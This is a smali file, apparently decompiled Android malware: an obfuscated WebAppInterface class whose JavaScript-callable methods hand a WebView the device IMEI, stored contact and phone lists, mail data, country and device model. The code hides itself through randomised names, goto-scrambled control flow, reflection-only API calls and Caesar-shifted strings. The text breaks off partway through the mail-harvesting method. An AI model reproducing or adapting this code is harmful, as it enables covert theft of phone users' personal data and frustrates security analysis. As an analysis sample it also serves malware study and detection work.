.class public Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;
.super Ljava/lang/Object;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/EDzgPz/KwIOuS/lvjaxn;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "WebAppInterface"
.end annotation


# instance fields
.field mContext:Landroid/content/Context;

.field final synthetic this$0:Lcom/EDzgPz/KwIOuS/lvjaxn;


# direct methods
.method constructor <init>(Lcom/EDzgPz/KwIOuS/lvjaxn;Landroid/content/Context;)V
    .locals 4
    .param p2, "c"    # Landroid/content/Context;

    .prologue
    nop

    goto :goto_3

    :goto_0
    nop

    return-void

    nop

    goto :goto_4

    :goto_1
    nop

    iput-object p2, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    nop

    goto :goto_1

    :goto_3
    nop

    iput-object p1, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->this$0:Lcom/EDzgPz/KwIOuS/lvjaxn;

    nop

    goto :goto_2

    :goto_4
    nop

    nop
.end method

.method private capitalize(Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xcapitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private xcapitalize(Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p1, "s"    # Ljava/lang/String;

    .prologue
    nop

    goto/16 :goto_11

    :goto_0
    nop

    goto/16 :goto_d

    nop

    goto/16 :goto_12

    :goto_1
    nop

    const/4 v3, 0x0

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const-string v3, "toString"

    const-class v6, Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    invoke-virtual {v3, v1, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Ljava/lang/String;

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    const-class v6, Ljava/lang/String;

    aput-object v6, v4, v3

    aput-object v2, v5, v3

    const-string v3, "append"

    const-class v6, Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    invoke-virtual {v3, v1, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/StringBuilder;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v6, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v3

    new-instance v6, Ljava/lang/Integer;

    invoke-direct {v6, v2}, Ljava/lang/Integer;-><init>(I)V

    aput-object v6, v5, v3

    const-string v3, "substring"

    const-class v6, Ljava/lang/String;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    invoke-virtual {v3, p1, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v2, 0x1

    nop

    goto :goto_3

    :goto_5
    nop

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_4

    :goto_6
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v6, Ljava/lang/Character;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v3

    new-instance v6, Ljava/lang/Character;

    invoke-direct {v6, v2}, Ljava/lang/Character;-><init>(C)V

    aput-object v6, v5, v3

    const-string v3, "valueOf"

    const-class v6, Ljava/lang/String;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v6, 0x0

    invoke-virtual {v3, v6, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    nop

    goto :goto_5

    :goto_7
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v6, Ljava/lang/Character;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v3

    new-instance v6, Ljava/lang/Character;

    invoke-direct {v6, v0}, Ljava/lang/Character;-><init>(C)V

    aput-object v6, v5, v3

    const-string v3, "toUpperCase"

    const-class v6, Ljava/lang/Character;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v6, 0x0

    invoke-virtual {v3, v6, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/Character;

    invoke-virtual {v3}, Ljava/lang/Character;->charValue()C

    move-result v2

    nop

    goto :goto_6

    :goto_8
    nop

    new-instance v1, Ljava/lang/StringBuilder;

    nop

    goto :goto_7

    :goto_9
    nop

    if-nez v1, :cond_1

    nop

    goto :goto_8

    :goto_a
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v6, Ljava/lang/Character;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v3

    new-instance v6, Ljava/lang/Character;

    invoke-direct {v6, v0}, Ljava/lang/Character;-><init>(C)V

    aput-object v6, v5, v3

    const-string v3, "isUpperCase"

    const-class v6, Ljava/lang/Character;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v6, 0x0

    invoke-virtual {v3, v6, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/Boolean;

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    nop

    goto :goto_9

    :goto_b
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v6, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v3

    new-instance v6, Ljava/lang/Integer;

    invoke-direct {v6, v1}, Ljava/lang/Integer;-><init>(I)V

    aput-object v6, v5, v3

    const-string v3, "charAt"

    const-class v6, Ljava/lang/String;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    invoke-virtual {v3, p1, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/Character;

    invoke-virtual {v3}, Ljava/lang/Character;->charValue()C

    move-result v0

    nop

    goto :goto_a

    :cond_0
    :goto_c
    nop

    const/4 v1, 0x0

    nop

    goto :goto_b

    :cond_1
    :goto_d
    nop

    return-object p1

    nop

    goto :goto_c

    :cond_2
    :goto_e
    nop

    const-string p1, ""

    invoke-static/range {p1 .. p1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    nop

    goto :goto_d

    :goto_f
    nop

    if-nez v1, :cond_0

    nop

    goto :goto_e

    :goto_10
    nop

    const/4 v3, 0x0

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const-string v3, "length"

    const-class v6, Ljava/lang/String;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    invoke-virtual {v3, p1, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/Integer;

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v1

    nop

    goto :goto_f

    :goto_11
    nop

    if-eqz p1, :cond_2

    nop

    goto :goto_10

    :goto_12
    nop

    nop
.end method

.method private xcountphones()I
    .locals 9
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_6

    :goto_0
    nop

    return v0

    nop

    goto :goto_7

    :goto_1
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v2, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getInt"

    const-class v8, Landroid/content/SharedPreferences;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/Integer;

    invoke-virtual {v5}, Ljava/lang/Integer;->intValue()I

    move-result v0

    nop

    goto :goto_0

    :goto_2
    nop

    const-string v2, "dpvouqipoft"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getSharedPreferences"

    const-class v8, Landroid/content/Context;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/SharedPreferences;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v3, "dpdpo"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_3

    :goto_5
    nop

    iget-object v2, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_4

    :goto_6
    nop

    const/4 v4, 0x0

    nop

    goto :goto_5

    :goto_7
    nop

    nop
.end method

.method private xcountry()Ljava/lang/String;
    .locals 5
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_5

    :goto_0
    nop

    return-object v0

    nop

    goto :goto_6

    :goto_1
    nop

    const/4 v1, 0x0

    new-array v2, v1, [Ljava/lang/Class;

    new-array v3, v1, [Ljava/lang/Object;

    const-string v1, "getCountry"

    const-class v4, Ljava/util/Locale;

    invoke-virtual {v4, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    invoke-virtual {v1, v0, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    nop

    goto :goto_0

    :goto_2
    nop

    iget-object v0, v0, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v1, 0x0

    new-array v2, v1, [Ljava/lang/Class;

    new-array v3, v1, [Ljava/lang/Object;

    const-string v1, "getConfiguration"

    const-class v4, Landroid/content/res/Resources;

    invoke-virtual {v4, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    invoke-virtual {v1, v0, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/res/Configuration;

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v1, 0x0

    new-array v2, v1, [Ljava/lang/Class;

    new-array v3, v1, [Ljava/lang/Object;

    const-string v1, "getResources"

    const-class v4, Landroid/content/Context;

    invoke-virtual {v4, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    invoke-virtual {v1, v0, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/res/Resources;

    nop

    goto :goto_3

    :goto_5
    nop

    iget-object v0, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_4

    :goto_6
    nop

    nop
.end method

.method private xgetDeviceName()Ljava/lang/String;
    .locals 8

    .prologue
    nop

    goto/16 :goto_e

    :goto_0
    nop

    goto/16 :goto_9

    nop

    goto/16 :goto_f

    :goto_1
    nop

    const/4 v4, 0x0

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const-string v4, "toString"

    const-class v7, Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, v2, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-class v7, Ljava/lang/String;

    aput-object v7, v5, v4

    aput-object v1, v6, v4

    const-string v4, "append"

    const-class v7, Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, v2, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/StringBuilder;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-class v7, Ljava/lang/String;

    aput-object v7, v5, v4

    aput-object v3, v6, v4

    const-string v4, "append"

    const-class v7, Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, v2, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/StringBuilder;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v3, "!"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_3

    :goto_5
    nop

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_4

    :goto_6
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-class v7, Ljava/lang/Object;

    aput-object v7, v5, v4

    aput-object v3, v6, v4

    const-string v4, "valueOf"

    const-class v7, Ljava/lang/String;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    const/4 v7, 0x0

    invoke-virtual {v4, v7, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    nop

    goto :goto_5

    :goto_7
    nop

    invoke-direct {p0, v0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_6

    :cond_0
    :goto_8
    nop

    new-instance v2, Ljava/lang/StringBuilder;

    nop

    goto :goto_7

    :goto_9
    nop

    return-object v2

    nop

    goto :goto_8

    :goto_a
    nop

    invoke-direct {p0, v1}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_9

    :goto_b
    nop

    if-eqz v2, :cond_0

    nop

    goto :goto_a

    :goto_c
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-class v7, Ljava/lang/String;

    aput-object v7, v5, v4

    aput-object v0, v6, v4

    const-string v4, "startsWith"

    const-class v7, Ljava/lang/String;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, v1, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/Boolean;

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    nop

    goto :goto_b

    :goto_d
    nop

    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    nop

    goto :goto_c

    :goto_e
    nop

    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    nop

    goto :goto_d

    :goto_f
    nop

    nop
.end method

.method private xgetcontacts()Ljava/lang/String;
    .locals 9
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_7

    :goto_0
    nop

    return-object v0

    nop

    goto :goto_8

    :goto_1
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v2, v7, v5

    const/4 v5, 0x1

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const-string v5, "getString"

    const-class v8, Landroid/content/SharedPreferences;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    nop

    goto :goto_0

    :goto_2
    nop

    const-string v3, ""

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_1

    :goto_3
    nop

    const-string v2, "mjtuqipoft"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getSharedPreferences"

    const-class v8, Landroid/content/Context;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/SharedPreferences;

    nop

    goto :goto_3

    :goto_5
    nop

    const/4 v4, 0x0

    nop

    goto :goto_4

    :goto_6
    nop

    const-string v3, "dpdpo"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_5

    :goto_7
    nop

    iget-object v2, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_6

    :goto_8
    nop

    nop
.end method

.method private xgetstatus()I
    .locals 9
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_6

    :goto_0
    nop

    return v0

    nop

    goto :goto_7

    :goto_1
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v2, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getInt"

    const-class v8, Landroid/content/SharedPreferences;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/Integer;

    invoke-virtual {v5}, Ljava/lang/Integer;->intValue()I

    move-result v0

    nop

    goto :goto_0

    :goto_2
    nop

    const-string v2, "tubuvt"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getSharedPreferences"

    const-class v8, Landroid/content/Context;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/SharedPreferences;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v3, "dpdpo"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_3

    :goto_5
    nop

    iget-object v2, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_4

    :goto_6
    nop

    const/4 v4, 0x0

    nop

    goto :goto_5

    :goto_7
    nop

    nop
.end method

.method private ximei()Ljava/lang/String;
    .locals 6
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_5

    :goto_0
    nop

    return-object v0

    nop

    goto :goto_6

    :goto_1
    nop

    const/4 v2, 0x0

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const-string v2, "getDeviceId"

    const-class v5, Landroid/telephony/TelephonyManager;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    nop

    goto :goto_0

    :goto_2
    nop

    check-cast v0, Landroid/telephony/TelephonyManager;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v2, 0x1

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Ljava/lang/String;

    aput-object v5, v3, v2

    aput-object v1, v4, v2

    const-string v2, "getSystemService"

    const-class v5, Landroid/content/Context;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Object;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v1, "qipof"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_3

    :goto_5
    nop

    iget-object v0, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_4

    :goto_6
    nop

    nop
.end method

.method private xlog(Ljava/lang/String;)V
    .locals 4
    .param p1, "str"    # Ljava/lang/String;
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_0

    :goto_0
    nop

    return-void

    nop

    goto :goto_1

    :goto_1
    nop

    nop
.end method

.method private xmail()Ljava/lang/String;
    .locals 13
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto/16 :goto_17

    :goto_0
    nop

    goto/16 :goto_10

    nop

    goto/16 :goto_18

    :cond_0
    :goto_1
    nop

    add-int/lit8 v5, v5, 0x1

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v9, 0x0

    new-array v10, v9, [Ljava/lang/Class;

    new-array v11, v9, [Ljava/lang/Object;

    const-string v9, "toString"

    const-class v12, Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    invoke-virtual {v9, v7, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v9, 0x1

    new-array v10, v9, [Ljava/lang/Class;

    new-array v11, v9, [Ljava/lang/Object;

    const/4 v9, 0x0

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v9

    aput-object v4, v11, v9

    const-string v9, "append"

    const-class v12, Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    invoke-virtual {v9, v7, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

